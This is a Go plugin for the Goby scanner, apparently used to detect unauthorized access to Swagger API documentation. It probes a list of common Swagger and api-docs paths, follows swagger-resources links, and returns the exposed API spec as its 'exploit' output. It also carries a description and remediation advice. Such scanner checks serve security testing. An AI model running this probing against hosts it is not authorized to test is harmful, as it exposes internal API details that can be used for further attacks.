package exploits

import (
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Swagger api Unauthorized Access Vulnerability",
    "Description": "<p>Swagger is a standardized and complete framework for generating, describing, invoking, and visualizing RESTful-style web services.</p><p>Swagger will automatically generate an API description document based on the developer's settings in the code. If there are relevant configuration flaws, the attacker can check the Swagger interface document without authorization, obtain the detailed parameters of the system function API interface, and then construct the parameter package. , obtain a large amount of sensitive information of the system through echo.</p>",
    "Product": "Swagger",
    "Homepage": "http://swagger.io/",
    "DisclosureDate": "2022-04-23",
    "PostTime": "2024-06-04",
    "Author": "Gryffinbit@gmail.com",
    "FofaQuery": "protocol=\"http\" || protocol=\"https\"",
    "GobyQuery": "protocol=\"http\" || protocol=\"https\"",
    "Level": "1",
    "Impact": "<p>An attacker can check the Swagger interface document without authorization to obtain the detailed parameters of the system function API interface, then construct a parameter package and obtain a large amount of sensitive information of the system through echo.</p>",
    "Recommendation": "<p>1. Block all Swagger related resources. If you use the SpringBoot framework, just configure swagger.production=true in the application.properties or application.yml configuration file.</p><p>2. Check whether there is sensitive information leakage in the interface (for example: account password, SecretKey, OSS configuration, etc.), and if so, make corresponding rectifications.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "api",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "Swagger api 未授权访问漏洞",
            "Product": "Swagger",
            "Description": "<p>Swagger 是一个规范和完整的框架，用于生成、描述、调用和可视化 RESTful 风格的 Web 服务。<br></p><p>Swagger 会根据开发人员在代码中的设置来自动生成 API 说明文档，若存在相关的配置缺陷，攻击者可以未授权翻查 Swagger 接口文档，得到系统功能 API 接口的详细参数，再构造参数发包，通过回显获取系统大量的敏感信息。<br></p>",
            "Recommendation": "<p>1. 屏蔽所有 Swagger 的相关资源。如果使用 SpringBoot 框架,只需在 application.properties 或者 application.yml 配置文件中配置 swagger.production=true。</p><p>2. 排查接口是否存在敏感信息泄露（例如：账号密码、SecretKey、OSS 配置等），若有则进行相应整改。</p>",
            "Impact": "<p>攻击者可以未授权翻查 Swagger 接口文档，得到系统功能 API 接口的详细参数，再构造参数发包，通过回显获取系统大量的敏感信息。<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Swagger api Unauthorized Access Vulnerability",
            "Product": "Swagger",
            "Description": "<p>Swagger is a standardized and complete framework for generating, describing, invoking, and visualizing RESTful-style web services.</p><p>Swagger will automatically generate an API description document based on the developer's settings in the code. If there are relevant configuration flaws, the attacker can check the Swagger interface document without authorization, obtain the detailed parameters of the system function API interface, and then construct the parameter package. , obtain a large amount of sensitive information of the system through echo.</p>",
            "Recommendation": "<p>1. Block all Swagger related resources. If you use the SpringBoot framework, just configure swagger.production=true in the application.properties or application.yml configuration file.</p><p>2. Check whether there is sensitive information leakage in the interface (for example: account password, SecretKey, OSS configuration, etc.), and if so, make corresponding rectifications.</p>",
            "Impact": "<p>An attacker can check the Swagger interface document without authorization to obtain the detailed parameters of the system function API interface, then construct a parameter package and obtain a large amount of sensitive information of the system through echo.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10897"
}`

	sendPayload7YFgdvRsuG3 := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {

		pathListOne := []string{`/api_docs`, `/api/docs/`,
			`/api/index.html`, `/swagger/v1/swagger.yaml`, `/swagger/v1/swagger.json`, `/swagger.yaml`, `/swagger.json`,
			`/api-docs/swagger.json`, "/api/swagger/api-docs", `/api-docs/swagger.yaml`, "/api.html",
			"/swagger.json", "/v2/api-docs", "/swagger-resources", "/api-docs", "/api/api-docs",
			"/api/apidocs", "/api/doc", "/api/v1/api-docs", "/api/v1/apidocs", "/api/v2/api-docs", "/api/v2/apidocs",
			"/apidocs", "/v1/api-docs", "/v2/api-docs", "/v3/api-docs", "/api/swagger-ui", "/libs/swaggerui", "/api.html",
			"/api-docs", "/doc", "/swagger", "/swagger-ui", "/swagger-ui.json", "/ui", "/security", "/index.html", "/swagger.php"}

		pathListTwo := []string{`/api/swagger-ui.html`, `/service/swagger-ui.html`,
			`/actuator/swagger-ui.html`, `/libs/swagger-ui.html`, `/template/swagger-ui.html`, `/api/swagger-ui.html`,
			"/swagger-ui.html"}

		pathListThree := []string{`/swagger/ui/index`}

		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(url)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
			reRequest := regexp.MustCompile(RegularUrl)
			if !reRequest.MatchString(RegularContent) {
				return "", fmt.Errorf("can't match value")
			}
			getname := reRequest.FindStringSubmatch(RegularContent)
			return getname[1], nil
		}

		for _, path_one := range pathListTwo {
			respOne, err := setGetRequest(hostInfo, path_one, map[string]string{})
			if err == nil && respOne.StatusCode == 200 && strings.Contains(respOne.RawBody, "Swagger UI"){
				respTwo, err := setGetRequest(hostInfo, strings.ReplaceAll(path_one, "/swagger-ui.html", "/swagger-resources"), map[string]string{})
				if err == nil && respTwo.StatusCode == 200 && strings.Contains(respTwo.RawBody, "swaggerVersion") && strings.Contains(respTwo.RawBody, "location"){
					content, err := makeRegular(respTwo.RawBody, `"location":"(.*?)"`)
					if err == nil && content != "" {
						if respThree, err := setGetRequest(hostInfo, content, map[string]string{}); err == nil  && strings.Contains(respThree.RawBody, "description") &&
							respThree.StatusCode == 200 && strings.Contains(respThree.RawBody, "description") && (strings.Contains(respThree.RawBody, "parameters") ||
								strings.Contains(respThree.RawBody, "swagger:")) &&strings.Contains(respThree.RawBody, "parameters"){
							return respOne, nil
						}
					}
				}
			}
		}

		for _, path_one := range pathListThree {
			respOne, err := setGetRequest(hostInfo, path_one, map[string]string{})
			if err != nil {
				continue
			}
			content, err := makeRegular(respOne.RawBody, `discoveryPaths: arrayFrom\('(.*?)'\)`)
			if err == nil && content != "" {
				if respTwo, err := setGetRequest(hostInfo, "/" + content, map[string]string{}); err == nil && !strings.Contains(respTwo.RawBody, "Message") &&
					strings.Contains(respTwo.RawBody, "description") && respTwo.StatusCode == 200 && strings.Contains(respTwo.RawBody, "description") &&
					(strings.Contains(respTwo.RawBody, "parameters") || strings.Contains(respTwo.RawBody, "swagger:")) && strings.Contains(respTwo.RawBody, "parameters"){
					return respOne, nil
				}
			}
		}


		for _, path_one := range pathListOne {
			resp, err := setGetRequest(hostInfo, path_one, map[string]string{})
			if err == nil && resp.StatusCode == 200 && ((strings.Contains(resp.Utf8Html, "\"info\"") && strings.Contains(resp.Utf8Html, "\"description\"") && strings.Contains(resp.Utf8Html, "\"parameters\"")) ||
				strings.Contains(resp.RawBody, `Swagger UI`) || strings.Contains(resp.RawBody, `swagger-ui.min.js`) || strings.Contains(resp.RawBody, `swagger:`) ||
				strings.Contains(resp.RawBody, `Swagger 2.0`) || strings.Contains(resp.RawBody, `"swagger":`)) {
				return resp, nil
			}
		}

		return nil, errors.New("漏洞利用失败")
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, err := sendPayload7YFgdvRsuG3(hostInfo)
			success := resp != nil && err == nil
			if success {
				stepLogs.VulURL = hostInfo.FixedHostInfo + resp.Request.URL.Path
			}
			return success
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "api" {
				if resp, err := sendPayload7YFgdvRsuG3(expResult.HostInfo); resp != nil && err == nil {
					expResult.Success = true
					expResult.Output = resp.Utf8Html
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = "漏洞利用失败"
				}
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
